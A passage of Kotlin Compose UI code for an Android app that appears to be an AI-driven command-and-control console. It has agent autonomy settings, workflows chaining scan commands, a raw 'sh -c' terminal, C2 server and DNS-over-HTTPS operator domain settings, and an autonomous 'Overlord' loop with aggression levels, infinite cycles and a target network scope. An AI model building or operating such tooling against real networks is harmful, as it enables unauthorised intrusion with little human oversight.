            OutlinedTextField(
                value = text,
                onValueChange = { text = it },
                modifier = Modifier.weight(1f),
                placeholder = { Text("message or /ai command", style = QuantumTypography.bodySmall) },
                singleLine = true,
            )
            IconButton(onClick = { showAttachDlg = true }) {
                Icon(
                    Icons.Outlined.AttachFile,
                    contentDescription = "Attach file",
                    tint = if (attachPath.isNotBlank()) Cyan else Muted,
                )
            }
            IconButton(onClick = { photoPicker.launch(PickVisualMediaRequest()) }) {
                Icon(
                    Icons.Outlined.Image,
                    contentDescription = "Attach photo or video",
                    tint = if (attachPath.isNotBlank()) Cyan else Muted,
                )
            }
            IconButton(
                onClick = {
                    val t = buildString {
                        if (attachPath.isNotBlank()) append(inlineAttachment(attachPath)).append(" ")
                        append(text)
                    }
                    text = ""
                    attachPath = ""
                    ChatController.send(t, scope, onAction)
                },
                enabled = !busy && text.isNotBlank(),
            ) {
                Icon(Icons.Outlined.Send, contentDescription = "Send", tint = Cyan)
            }
        }
        if (attachPath.isNotBlank()) {
            Text(
                "attach: $attachPath",
                style = QuantumTypography.labelSmall,
                color = Cyan,
            )
        }
    }

    if (showAttachDlg) {
        AlertDialog(
            onDismissRequest = { showAttachDlg = false },
            containerColor = Panel,
            title = { Text("Attach", color = Cyan) },
            text = {
                Column {
                    OutlinedButton(
                        onClick = {
                            showAttachDlg = false
                            filePicker.launch(arrayOf("*/*"))
                        },
                        modifier = Modifier.fillMaxWidth(),
                    ) { Text("Pick any file (SAF)") }
                    Spacer(Modifier.height(6.dp))
                    OutlinedButton(
                        onClick = {
                            showAttachDlg = false
                            photoPicker.launch(PickVisualMediaRequest())
                        },
                        modifier = Modifier.fillMaxWidth(),
                    ) { Text("Pick photo / video") }
                    Spacer(Modifier.height(10.dp))
                    Text(
                        "Or enter a device file path manually:",
                        style = QuantumTypography.bodySmall,
                        color = Muted,
                    )
                    Spacer(Modifier.height(6.dp))
                    OutlinedTextField(
                        value = attachPath,
                        onValueChange = { attachPath = it },
                        label = { Text("file path") },
                        singleLine = true,
                        modifier = Modifier.fillMaxWidth(),
                    )
                }
            },
            confirmButton = {
                Button(onClick = { showAttachDlg = false }) { Text("Done") }
            },
            dismissButton = {
                TextButton(onClick = {
                    attachPath = ""
                    showAttachDlg = false
                }) { Text("Clear") }
            },
        )
    }
}

// ---------------------------------------------------------------------------
// Agents — SLDR + NS-org registry (view / add / edit / delete)
// ---------------------------------------------------------------------------

@Composable
fun AgentsPage() {
    val agents by AgentStore.agents.collectAsState()
    var selected by rememberSaveable { mutableStateOf<String?>(null) }
    var edit by remember { mutableStateOf<AgentDef?>(null) }

    LaunchedEffect(Unit) { AgentStore.load() }

    Column(
        Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(horizontal = 20.dp),
    ) {
        Text("Agents", style = QuantumTypography.displaySmall, color = Cyan)
        Spacer(Modifier.height(4.dp))
        Text(
            "The operator bench: SLDR (sovereign operator) and the NS-org subagents. " +
                "Tap an agent to inspect its system prompt and autonomy level.",
            style = QuantumTypography.bodySmall,
            color = Muted,
        )
        Spacer(Modifier.height(8.dp))
        Button(onClick = { edit = AgentDef("", "", "", "manual") }, modifier = Modifier.fillMaxWidth()) {
            Text("NEW AGENT")
        }
        Spacer(Modifier.height(8.dp))
        agents.forEach { a ->
            Column(Modifier.fillMaxWidth().quantumPanel().padding(12.dp)) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Column(Modifier.weight(1f)) {
                        Text(a.name.ifBlank { a.id }, style = QuantumTypography.titleSmall, color = Cyan)
                        Text(
                            "id=${a.id} · autonomy=${a.autonomy}",
                            style = QuantumTypography.bodySmall,
                            color = SoftCyan,
                        )
                    }
                }
                if (selected == a.id) {
                    Spacer(Modifier.height(6.dp))
                    Text(
                        a.systemPrompt,
                        style = QuantumTypography.bodySmall,
                        color = Softest,
                    )
                }
                Spacer(Modifier.height(8.dp))
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    OutlinedButton(onClick = {
                        selected = if (selected == a.id) null else a.id
                    }) { Text(if (selected == a.id) "COLLAPSE" else "VIEW PROMPT") }
                    OutlinedButton(onClick = { edit = a }) { Text("EDIT") }
                    OutlinedButton(onClick = {
                        AgentStore.delete(a.id)
                        if (selected == a.id) selected = null
                    }) { Text("DELETE") }
                }
            }
            Spacer(Modifier.height(8.dp))
        }
        Spacer(Modifier.height(16.dp))
    }

    if (edit != null) {
        AgentEditDialog(
            agent = edit!!,
            onDismiss = { edit = null },
            onSave = { a ->
                AgentStore.upsert(a)
                edit = null
            },
        )
    }
}

@Composable
private fun AgentEditDialog(
    agent: AgentDef,
    onDismiss: () -> Unit,
    onSave: (AgentDef) -> Unit,
) {
    var name by rememberSaveable { mutableStateOf(agent.name) }
    var prompt by rememberSaveable { mutableStateOf(agent.systemPrompt) }
    var autonomy by rememberSaveable { mutableStateOf(agent.autonomy) }

    AlertDialog(
        onDismissRequest = onDismiss,
        containerColor = Panel,
        title = { Text(if (agent.id.isBlank()) "New agent" else "Edit ${agent.id}", color = Cyan) },
        text = {
            Column(Modifier.verticalScroll(rememberScrollState())) {
                OutlinedTextField(
                    value = name,
                    onValueChange = { name = it },
                    label = { Text("Name") },
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                )
                Spacer(Modifier.height(8.dp))
                Text("Autonomy", color = Softest, style = QuantumTypography.bodySmall)
                Row(Modifier.fillMaxWidth()) {
                    listOf("manual", "semi", "auto").forEach { ag ->
                        Row(Modifier.weight(1f), verticalAlignment = Alignment.CenterVertically) {
                            RadioButton(selected = autonomy == ag, onClick = { autonomy = ag })
                            Text(ag, color = SoftCyan, style = QuantumTypography.labelSmall)
                        }
                    }
                }
                Spacer(Modifier.height(8.dp))
                OutlinedTextField(
                    value = prompt,
                    onValueChange = { prompt = it },
                    label = { Text("System prompt") },
                    modifier = Modifier.fillMaxWidth().height(160.dp),
                )
            }
        },
        confirmButton = {
            Button(
                enabled = name.isNotBlank() && prompt.isNotBlank(),
                onClick = {
                    val id = agent.id.ifBlank {
                        name.trim().lowercase().replace(Regex("[^a-z0-9]+"), "-").trim('-')
                    }
                    onSave(AgentDef(id, name.trim(), prompt.trim(), autonomy))
                },
            ) { Text("Save") }
        },
        dismissButton = { TextButton(onClick = onDismiss) { Text("Cancel") } },
    )
}

// ---------------------------------------------------------------------------
// Skills — prompt packs + sample workflows
// ---------------------------------------------------------------------------

@Composable
fun SkillsPage() {
    val actions = LocalUiActions.current
    val scope = rememberCoroutineScope()
    val skills by SkillStore.skills.collectAsState()
    val workflows by WorkflowStore.workflows.collectAsState()
    var compose by remember { mutableStateOf<SkillDef?>(null) }
    var running by remember { mutableStateOf(false) }
    var wfResult by remember { mutableStateOf("workflow results appear here") }

    LaunchedEffect(Unit) {
        SkillStore.load()
        WorkflowStore.load()
    }

    Column(
        Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(horizontal = 20.dp),
    ) {
        Text("Skills", style = QuantumTypography.displaySmall, color = Cyan)
        Spacer(Modifier.height(4.dp))
        Text(
            "Skill packs compose a ready prompt for the chat brain; workflows chain " +
                "/ai commands (variables like \${first_host} auto-fill from scan output).",
            style = QuantumTypography.bodySmall,
            color = Muted,
        )
        Spacer(Modifier.height(12.dp))

        skills.forEach { s ->
            Column(Modifier.fillMaxWidth().quantumPanel().padding(12.dp)) {
                Text(s.name.ifBlank { s.id }, style = QuantumTypography.titleSmall, color = Cyan)
                Text(
                    s.description,
                    style = QuantumTypography.bodySmall,
                    color = SoftCyan,
                )
                Text(
                    "id=${s.id}",
                    style = QuantumTypography.labelSmall,
                    color = Muted,
                )
                Spacer(Modifier.height(8.dp))
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    FilledTonalButton(onClick = { compose = s }) { Text("COMPOSE PROMPT") }
                    OutlinedButton(onClick = { SkillStore.delete(s.id) }) { Text("DELETE") }
                }
            }
            Spacer(Modifier.height(8.dp))
        }

        HorizontalDivider(color = Cyan.copy(0.18f), modifier = Modifier.padding(vertical = 8.dp))
        Text("Workflows", style = QuantumTypography.titleSmall, color = SoftCyan)
        Spacer(Modifier.height(6.dp))
        workflows.forEach { w ->
            Column(Modifier.fillMaxWidth().quantumPanel().padding(12.dp)) {
                Text(w.name.ifBlank { w.id }, style = QuantumTypography.titleSmall, color = Cyan)
                Text(
                    w.description,
                    style = QuantumTypography.bodySmall,
                    color = SoftCyan,
                )
                Text(
                    "steps: " + w.steps.joinToString(" -> ") { it.cmd },
                    style = QuantumTypography.labelSmall,
                    color = Muted,
                )
                Spacer(Modifier.height(8.dp))
                OutlinedButton(
                    onClick = {
                        running = true
                        scope.launch {
                            val results = withContext(Dispatchers.IO) { WorkflowRunner.run(w) }
                            wfResult = results.joinToString("\n") {
                                (if (it.ok) "OK " else "ERR ") + it.cmd + ": " + it.output.take(120)
                            }
                            running = false
                        }
                    },
                    enabled = !running,
                ) { Text(if (running) "RUNNING…" else "RUN") }
            }
            Spacer(Modifier.height(8.dp))
        }
        Column(
            Modifier
                .fillMaxWidth()
                .quantumPanel()
                .padding(10.dp)
                .height(120.dp)
                .verticalScroll(rememberScrollState()),
        ) {
            Text(wfResult, style = QuantumTypography.bodySmall, color = Softest, fontSize = 11.sp)
        }
        Spacer(Modifier.height(16.dp))
    }

    if (compose != null) {
        SkillComposeDialog(
            skill = compose!!,
            onDismiss = { compose = null },
            onSend = { prompt ->
                ChatController.send(prompt, scope, actions.onChatAction)
                compose = null
            },
        )
    }
}

@Composable
private fun SkillComposeDialog(
    skill: SkillDef,
    onDismiss: () -> Unit,
    onSend: (String) -> Unit,
) {
    var prompt by rememberSaveable { mutableStateOf(skill.prompt) }

    AlertDialog(
        onDismissRequest = onDismiss,
        containerColor = Panel,
        title = { Text("Compose · ${skill.name}", color = Cyan) },
        text = {
            Column(Modifier.verticalScroll(rememberScrollState())) {
                Text(
                    "Edit the prompt, then send it to the chat brain.",
                    style = QuantumTypography.bodySmall,
                    color = Muted,
                )
                Spacer(Modifier.height(8.dp))
                OutlinedTextField(
                    value = prompt,
                    onValueChange = { prompt = it },
                    label = { Text("prompt") },
                    modifier = Modifier.fillMaxWidth().height(180.dp),
                )
            }
        },
        confirmButton = {
            Button(
                enabled = prompt.isNotBlank(),
                onClick = { onSend(prompt.trim()) },
            ) { Text("Send to chat") }
        },
        dismissButton = { TextButton(onClick = onDismiss) { Text("Cancel") } },
    )
}

// ---------------------------------------------------------------------------
// Tasks — workflow creation, modification, removal + runs
// ---------------------------------------------------------------------------

@Composable
fun TasksPage() {
    val workflows by WorkflowStore.workflows.collectAsState()
    val scope = rememberCoroutineScope()
    var showEditor by remember { mutableStateOf(false) }
    var editing by remember { mutableStateOf<WorkflowDef?>(null) }
    var running by remember { mutableStateOf<String?>(null) }
    var runResults by remember { mutableStateOf<Pair<String, List<WorkflowRunner.StepResult>>?>(null) }

    LaunchedEffect(Unit) { WorkflowStore.load() }

    Column(
        Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(horizontal = 20.dp),
    ) {
        Text("Tasks", style = QuantumTypography.displaySmall, color = Cyan)
        Spacer(Modifier.height(4.dp))
        Text(
            "Named chains of /ai commands with \${var} templating — create, edit, delete, run.",
            style = QuantumTypography.bodySmall,
            color = Muted,
        )
        Spacer(Modifier.height(12.dp))

        Button(
            onClick = {
                editing = WorkflowDef(
                    id = "wf_" + System.currentTimeMillis(),
                    name = "",
                    description = "",
                    steps = listOf(WorkflowStep("scan")),
                )
                showEditor = true
            },
            modifier = Modifier.fillMaxWidth(),
        ) { Text("+ NEW WORKFLOW") }
        Spacer(Modifier.height(10.dp))

        if (workflows.isEmpty()) {
            Text("No workflows yet — create one or rely on the seeded chains.", color = Muted)
        }
        workflows.forEach { wf ->
            Column(Modifier.fillMaxWidth().quantumPanel().padding(12.dp)) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Text(
                        wf.name.ifBlank { wf.id },
                        style = QuantumTypography.titleSmall,
                        color = Cyan,
                        modifier = Modifier.weight(1f),
                    )
                    Text(
                        "${wf.steps.size} step(s)",
                        style = QuantumTypography.labelSmall,
                        color = Muted,
                    )
                }
                if (wf.description.isNotBlank()) {
                    Text(wf.description, style = QuantumTypography.bodySmall, color = SoftCyan)
                }
                wf.steps.forEachIndexed { i, st ->
                    Text(
                        "${i + 1}. /ai ${st.cmd}" +
                            (st.params.entries.joinToString("") { " ${it.key}=${it.value}" }),
                        style = QuantumTypography.bodySmall,
                        color = Softest,
                    )
                }
                Spacer(Modifier.height(8.dp))
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    FilledTonalButton(
                        onClick = {
                            running = wf.id
                            scope.launch {
                                val results = withContext(Dispatchers.IO) {
                                    WorkflowRunner.run(wf)
                                }
                                running = null
                                runResults = wf.id to results
                            }
                        },
                        enabled = running == null,
                    ) { Text(if (running == wf.id) "RUNNING…" else "RUN") }
                    OutlinedButton(onClick = {
                        editing = wf
                        showEditor = true
                    }) { Text("EDIT") }
                    OutlinedButton(onClick = {
                        WorkflowStore.delete(wf.id)
                        "deleted workflow ${wf.id}"
                    }) { Text("DELETE") }
                }
            }
            Spacer(Modifier.height(8.dp))
        }
        Spacer(Modifier.height(16.dp))
    }

    if (showEditor && editing != null) {
        WorkflowEditorDialog(
            initial = editing!!,
            onSave = { WorkflowStore.upsert(it) },
            onDismiss = { showEditor = false },
        )
    }
    if (runResults != null) {
        val (id, results) = runResults!!
        AlertDialog(
            onDismissRequest = { runResults = null },
            containerColor = Panel,
            title = { Text("Run complete · $id", color = Cyan) },
            text = {
                Column {
                    results.forEach { r ->
                        Text(
                            (if (r.ok) "OK  " else "FAIL") + " /ai " + r.cmd,
                            style = QuantumTypography.bodySmall,
                            color = if (r.ok) Ok else Danger,
                        )
                        Text(
                            r.output,
                            style = QuantumTypography.bodySmall,
                            color = Muted,
                            maxLines = 3,
                        )
                        Spacer(Modifier.height(6.dp))
                    }
                }
            },
            confirmButton = {
                TextButton(onClick = { runResults = null }) { Text("Close") }
            },
        )
    }
}

/** Create/edit dialog: name, description, ordered steps (cmd + k=v params). */
@Composable
private fun WorkflowEditorDialog(
    initial: WorkflowDef,
    onSave: (WorkflowDef) -> Unit,
    onDismiss: () -> Unit,
) {
    var name by remember { mutableStateOf(initial.name) }
    var desc by remember { mutableStateOf(initial.description) }
    val steps = remember { mutableStateListOf<WorkflowStep>().also { it.addAll(initial.steps) } }

    AlertDialog(
        onDismissRequest = onDismiss,
        containerColor = Panel,
        title = { Text(if (initial.name.isBlank()) "New workflow" else "Edit workflow", color = Cyan) },
        text = {
            Column(Modifier.verticalScroll(rememberScrollState())) {
                OutlinedTextField(
                    value = name,
                    onValueChange = { name = it },
                    label = { Text("name") },
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                )
                Spacer(Modifier.height(6.dp))
                OutlinedTextField(
                    value = desc,
                    onValueChange = { desc = it },
                    label = { Text("description") },
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                )
                Spacer(Modifier.height(10.dp))
                Text("Steps", style = QuantumTypography.titleSmall, color = SoftCyan)
                steps.forEachIndexed { i, st ->
                    Row(verticalAlignment = Alignment.CenterVertically) {
                        Text("${i + 1}.", color = Muted, style = QuantumTypography.bodySmall)
                        Spacer(Modifier.width(6.dp))
                        Column(Modifier.weight(1f)) {
                            OutlinedTextField(
                                value = st.cmd,
                                onValueChange = { newCmd ->
                                    steps[i] = st.copy(cmd = newCmd)
                                },
                                label = { Text("command") },
                                singleLine = true,
                                modifier = Modifier.fillMaxWidth(),
                            )
                            OutlinedTextField(
                                value = st.params.entries.joinToString(",") { "${it.key}=${it.value}" },
                                onValueChange = { raw ->
                                    val m = LinkedHashMap<String, String>()
                                    raw.split(",").forEach { pair ->
                                        val idx = pair.indexOf('=')
                                        if (idx > 0) {
                                            m[pair.substring(0, idx).trim()] = pair.substring(idx + 1)
                                        }
                                    }
                                    steps[i] = st.copy(params = m)
                                },
                                label = { Text("params (key=value, …)") },
                                singleLine = true,
                                modifier = Modifier.fillMaxWidth(),
                            )
                        }
                        IconButton(onClick = { steps.removeAt(i) }) {
                            Icon(Icons.Outlined.Delete, contentDescription = "Remove step", tint = Danger)
                        }
                    }
                    Spacer(Modifier.height(6.dp))
                }
                OutlinedButton(onClick = {
                    steps.add(WorkflowStep(""))
                }) { Text("+ ADD STEP") }
            }
        },
        confirmButton = {
            Button(
                onClick = {
                    if (name.isBlank() || steps.none { it.cmd.isNotBlank() }) return@Button
                    onSave(
                        WorkflowDef(
                            id = initial.id,
                            name = name.trim(),
                            description = desc.trim(),
                            steps = steps.filter { it.cmd.isNotBlank() },
                        )
                    )
                    onDismiss()
                },
            ) { Text("Save") }
        },
        dismissButton = { TextButton(onClick = onDismiss) { Text("Cancel") } },
    )
}

// ---------------------------------------------------------------------------
// Terminal — local shell console ('/ai ' prefix routes to ChatController)
// ---------------------------------------------------------------------------

@Composable
fun TerminalPage() {
    val actions = LocalUiActions.current
    val scope = rememberCoroutineScope()
    var input by rememberSaveable { mutableStateOf("") }
    var busy by remember { mutableStateOf(false) }
    val log = remember {
        mutableStateListOf(
            "local shell ready — plain commands run via 'sh -c'; " +
                "prefix '/ai ' to route a command through the chat brain."
        )
    }
    val listState = rememberLazyListState()

    fun append(line: String) {
        log.add(line)
    }

    LaunchedEffect(log.size) {
        if (log.isNotEmpty()) listState.animateScrollToItem(log.size - 1)
    }

    fun run(raw: String) {
        val cmdline = raw.trim()
        if (cmdline.isEmpty() || busy) return
        append("\$ $cmdline")
        busy = true
        scope.launch {
            if (cmdline.startsWith("/ai ")) {
                val chatText = cmdline.removePrefix("/ai ").trim()
                append("[chat] routed to ChatController: $chatText")
                ChatController.send(chatText, scope, actions.onChatAction)
            } else {
                withContext(Dispatchers.IO) {
                    try {
                        val proc = ProcessBuilder("sh", "-c", cmdline)
                            .redirectErrorStream(true)
                            .start()
                        proc.inputStream.bufferedReader().useLines { lines ->
                            lines.forEach { append(it) }
                        }
                        val code = proc.waitFor()
                        append("[exit $code]")
                    } catch (e: Exception) {
                        append(
                            "sh failed: ${e.message} — this command may need a full " +
                                "shell (try 'ls' or 'id', or prefix '/ai ' for the chat dispatcher)"
                        )
                    }
                }
            }
            busy = false
        }
    }

    // ---- console log controls: view / download / clear --------------------
    val ctx = LocalContext.current
    var showLog by remember { mutableStateOf(false) }
    var pendingLog by remember { mutableStateOf<String?>(null) }
    val saveLogPicker = rememberLauncherForActivityResult(
        ActivityResultContracts.CreateDocument("text/plain")
    ) { uri ->
        val content = pendingLog
        pendingLog = null
        if (uri != null && content != null) {
            try {
                ctx.contentResolver.openOutputStream(uri)?.use { out ->
                    out.write(content.toByteArray())
                }
                append("[log saved via SAF]")
            } catch (e: Exception) {
                append("[log save failed: ${e.message}]")
            }
        }
    }

    Column(Modifier.fillMaxSize().padding(horizontal = 16.dp)) {
        Row(verticalAlignment = Alignment.CenterVertically) {
            Text("Terminal", style = QuantumTypography.displaySmall, color = Cyan)
            Spacer(Modifier.weight(1f))
            IconButton(onClick = { showLog = true }) {
                Icon(Icons.Outlined.Visibility, contentDescription = "View log", tint = SoftCyan)
            }
            IconButton(onClick = {
                pendingLog = log.joinToString("\n")
                saveLogPicker.launch("quantum-terminal-log.txt")
            }) {
                Icon(Icons.Outlined.Download, contentDescription = "Download log", tint = SoftCyan)
            }
            IconButton(onClick = {
                log.clear()
                append("[console cleared]")
            }) {
                Icon(Icons.Outlined.Delete, contentDescription = "Clear log", tint = Muted)
            }
        }
        Spacer(Modifier.height(8.dp))
        LazyColumn(
            state = listState,
            modifier = Modifier
                .weight(1f)
                .fillMaxWidth()
                .quantumPanel()
                .padding(8.dp),
        ) {
            items(log) { line ->
                Text(
                    line,
                    style = QuantumTypography.bodySmall,
                    color = if (line.startsWith("$ ")) Cyan else Softest,
                    fontSize = 11.sp,
                    lineHeight = 14.sp,
                    modifier = Modifier.padding(vertical = 1.dp),
                )
            }
        }
        Spacer(Modifier.height(8.dp))
        Row(verticalAlignment = Alignment.CenterVertically) {
            OutlinedTextField(
                value = input,
                onValueChange = { input = it },
                modifier = Modifier.weight(1f),
                placeholder = { Text("command (or /ai <cmd>)", style = QuantumTypography.bodySmall) },
                singleLine = true,
            )
            IconButton(
                onClick = {
                    val t = input
                    input = ""
                    run(t)
                },
                enabled = !busy && input.isNotBlank(),
            ) {
                Icon(Icons.Outlined.Send, contentDescription = "Run", tint = Cyan)
            }
        }
        Spacer(Modifier.height(12.dp))
    }

    if (showLog) {
        AlertDialog(
            onDismissRequest = { showLog = false },
            title = { Text("Terminal log", style = QuantumTypography.titleSmall, color = Cyan) },
            text = {
                LazyColumn(Modifier.fillMaxWidth().height(420.dp)) {
                    items(log) { line ->
                        Text(
                            line,
                            style = QuantumTypography.bodySmall,
                            color = if (line.startsWith("$ ")) Cyan else Softest,
                            fontSize = 10.sp,
                            lineHeight = 13.sp,
                        )
                    }
                }
            },
            confirmButton = {
                TextButton(onClick = { showLog = false }) { Text("Close") }
            },
        )
    }
}

// ---------------------------------------------------------------------------
// Settings — AI, server, overlord defaults, updates, manual
// ---------------------------------------------------------------------------

@Composable
fun SettingsPage() {
    val actions = LocalUiActions.current
    val ctx = LocalContext.current
    val scope = rememberCoroutineScope()
    val settings by QuantSettings.state.collectAsState()
    val serverRunning by QuantServerManager.running.collectAsState()
    var c2Port by rememberSaveable { mutableStateOf(settings.c2Port.toString()) }
    var apiUrl by rememberSaveable { mutableStateOf(settings.apiUrl) }
    var apiKey by rememberSaveable {
        mutableStateOf(if (settings.aiApiKey.isNotBlank()) settings.aiApiKey else settings.apiKey)
    }
    var model by rememberSaveable { mutableStateOf(settings.model) }
    var cyclesText by rememberSaveable { mutableStateOf(settings.overlordCycles.toString()) }
    var scopeText by rememberSaveable { mutableStateOf(settings.overlordScope) }
    var domainText by rememberSaveable { mutableStateOf(settings.c2Domain) }
    var remoteHost by rememberSaveable { mutableStateOf(settings.c2RemoteHost) }
    var showRemoteDialog by remember { mutableStateOf(false) }
    var updateResult by remember { mutableStateOf<UpdateChecker.Result?>(null) }
    var checking by remember { mutableStateOf(false) }

    Column(
        Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(horizontal = 20.dp),
    ) {
        Text("Settings", style = QuantumTypography.displaySmall, color = Cyan)
        Spacer(Modifier.height(12.dp))

        // ---- AI ---------------------------------------------------------
        Text("AI brain", style = QuantumTypography.titleSmall, color = SoftCyan)
        Spacer(Modifier.height(4.dp))
        listOf(
            AiClient.MODE_ONLINE to "Online AI (cloud)",
            AiClient.MODE_LOCAL to "Local on-device model",
            AiClient.MODE_DETERMINISTIC to "Manual / no AI",
        ).forEach { (mode, label) ->
            Row(Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
                RadioButton(
                    selected = settings.aiMode == mode,
                    onClick = { QuantSettings.update { it.copy(aiMode = mode) } },
                )
                Text(label, color = Softest, style = QuantumTypography.bodyMedium)
            }
        }
        Spacer(Modifier.height(8.dp))
        Text("Provider preset", style = QuantumTypography.bodySmall, color = SoftCyan)
        Providers.PRESETS.forEach { preset ->
            Row(Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
                RadioButton(
                    selected = settings.aiProvider == preset.id,
                    onClick = {
                        QuantSettings.update {
                            it.copy(
                                aiProvider = preset.id,
                                apiUrl = preset.url,
                                model = preset.model,
                            )
                        }
                        apiUrl = preset.url
                        model = preset.model
                    },
                )
                Column {
                    Text(preset.label, color = Softest, style = QuantumTypography.bodyMedium)
                    Text(
                        "${preset.url} · ${preset.model}",
                        style = QuantumTypography.labelSmall,
                        color = Muted,
                    )
                }
            }
        }
        if (settings.aiMode == AiClient.MODE_LOCAL && !AiClient.localAvailable()) {
            Button(
                onClick = { AiModelDownloader.start() },
                modifier = Modifier.padding(vertical = 4.dp),
            ) { Text("Download local fallback model") }
        }
        OutlinedTextField(
            value = apiUrl, onValueChange = { apiUrl = it },
            label = { Text("API URL") }, singleLine = true, modifier = Modifier.fillMaxWidth(),
        )
        Spacer(Modifier.height(6.dp))
        OutlinedTextField(
            value = apiKey, onValueChange = { apiKey = it },
            label = { Text("API key") }, singleLine = true, modifier = Modifier.fillMaxWidth(),
        )
        Spacer(Modifier.height(6.dp))
        OutlinedTextField(
            value = model, onValueChange = { model = it },
            label = { Text("Model") }, singleLine = true, modifier = Modifier.fillMaxWidth(),
        )
        Spacer(Modifier.height(8.dp))
        Button(onClick = {
            QuantSettings.update {
                it.copy(
                    apiUrl = apiUrl.trim(),
                    apiKey = apiKey.trim(),
                    aiApiKey = apiKey.trim(),
                    model = model.trim(),
                )
            }
            C2State.audit("AI", "settings saved (endpoint ${apiUrl.trim()}, model ${model.trim()})")
        }) { Text("SAVE AI SETTINGS") }

        HorizontalDivider(color = Cyan.copy(0.18f), modifier = Modifier.padding(vertical = 12.dp))

        // ---- C2 server ----------------------------------------------------
        Text("C2 server", style = QuantumTypography.titleSmall, color = SoftCyan)
        Spacer(Modifier.height(4.dp))
        Text(
            "status: " + (if (serverRunning) "running" else "stopped") +
                (if (serverRunning) " at http://${c2Api.c2HostPort()}/dash" else ""),
            style = QuantumTypography.bodySmall,
            color = if (serverRunning) Ok else Muted,
        )
        OutlinedTextField(
            value = c2Port,
            onValueChange = { c2Port = it.filter { c -> c.isDigit() } },
            label = { Text("C2 port") },
            singleLine = true,
            modifier = Modifier.fillMaxWidth(),
        )
        Row(Modifier.padding(vertical = 6.dp), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            Button(onClick = {
                val port = c2Port.toIntOrNull() ?: settings.c2Port
                QuantSettings.update { it.copy(c2Port = port) }
                ioOp("C2") {
                    if (QuantServerManager.start(port)) "C2 restarted on :$port"
                    else "C2 start failed on :$port"
                }
            }) { Text("APPLY / RESTART") }
            OutlinedButton(onClick = { ioOp("C2") { QuantServerManager.stop(); "C2 stopped" } }) {
                Text("STOP")
            }
        }
        SettingSwitch(
            "Auto-start C2 server on app open",
            settings.autostart,
        ) { QuantSettings.update { it.copy(autostart = it.autostart.not()) } }

        HorizontalDivider(color = Cyan.copy(0.18f), modifier = Modifier.padding(vertical = 12.dp))

        // ---- C2 destination (self-host vs remote-connect) -------------------
        Text("C2 destination", style = QuantumTypography.titleSmall, color = SoftCyan)
        Spacer(Modifier.height(4.dp))
        Row(Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically) {
            Text(
                "Mode: ${if (settings.c2Mode == "self_host") "Self-Host" else "Remote-Connect"}",
                color = if (settings.c2Mode == "self_host") Ok else SoftCyan,
                modifier = Modifier.weight(1f),
                style = QuantumTypography.bodyMedium,
            )
            OutlinedButton(onClick = { showRemoteDialog = true }) {
                Text(
                    if (settings.c2Mode == "self_host") "SWITCH TO REMOTE"
                    else "EDIT REMOTE URL",
                    style = QuantumTypography.bodySmall,
                )
            }
        }
        if (settings.c2RemoteHost.isNotBlank()) {
            Text(
                "Remote: ${settings.c2RemoteHost}",
                style = QuantumTypography.bodySmall,
                color = SoftCyan,
                modifier = Modifier.padding(top = 4.dp),
            )
        }

        HorizontalDivider(color = Cyan.copy(0.18f), modifier = Modifier.padding(vertical = 12.dp))

        // ---- overlord defaults ---------------------------------------------
        Text("Overlord defaults", style = QuantumTypography.titleSmall, color = SoftCyan)
        Spacer(Modifier.height(4.dp))
        SettingSwitch(
            "Camera-only acts",
            settings.overlordCameraOnly,
        ) { QuantSettings.update { it.copy(overlordCameraOnly = it.overlordCameraOnly.not()) } }
        Text(
            "Interval: ${settings.overlordIntervalSec}s",
            color = Softest,
            style = QuantumTypography.bodySmall,
        )
        Slider(
            value = settings.overlordIntervalSec.toFloat(),
            onValueChange = { QuantSettings.update { s -> s.copy(overlordIntervalSec = it.toInt()) } },
            valueRange = 10f..300f,
            steps = 57,
        )
        Spacer(Modifier.height(6.dp))
        Text("Aggression", color = Softest, style = QuantumTypography.bodySmall)
        Row(Modifier.fillMaxWidth()) {
            listOf("balanced", "aggressive", "patient").forEach { ag ->
                Row(Modifier.weight(1f), verticalAlignment = Alignment.CenterVertically) {
                    RadioButton(
                        selected = settings.overlordAggression == ag,
                        onClick = { QuantSettings.update { it.copy(overlordAggression = ag) } },
                    )
                    Text(ag, color = SoftCyan, style = QuantumTypography.labelSmall)
                }
            }
        }
        Text(
            if (settings.overlordCycles == 0) "Cycles: infinite" else "Cycles: ${settings.overlordCycles}",
            color = Softest,
            style = QuantumTypography.bodySmall,
        )
        OutlinedTextField(
            value = cyclesText,
            onValueChange = { v ->
                val d = v.filter { it.isDigit() }.take(5)
                cyclesText = d
                QuantSettings.update { it.copy(overlordCycles = d.toIntOrNull() ?: 0) }
            },
            label = { Text("Cycles (0 = infinite)") },
            singleLine = true,
            modifier = Modifier.fillMaxWidth(),
        )
        Spacer(Modifier.height(6.dp))
        OutlinedTextField(
            value = scopeText,
            onValueChange = { v ->
                scopeText = v
                QuantSettings.update { it.copy(overlordScope = v.trim()) }
            },
            label = { Text("Overlord target scope (CIDR)") },
            placeholder = { Text("blank = local /24") },
            singleLine = true,
            modifier = Modifier.fillMaxWidth(),
        )
        Spacer(Modifier.height(6.dp))
        OutlinedTextField(
            value = domainText,
            onValueChange = { v ->
                domainText = v
                QuantSettings.update { it.copy(c2Domain = v.trim()) }
            },
            label = { Text("C2 operator domain (GhostDNS / DoH)") },
            singleLine = true,
            modifier = Modifier.fillMaxWidth(),
        )
        SettingSwitch(
            "Auto-download local AI fallback on app open",
            settings.autoDownload,
        ) { QuantSettings.update { it.copy(autoDownload = it.autoDownload.not()) } }

        HorizontalDivider(color = Cyan.copy(0.18f), modifier = Modifier.padding(vertical = 12.dp))

        // ---- updates --------------------------------------------------------
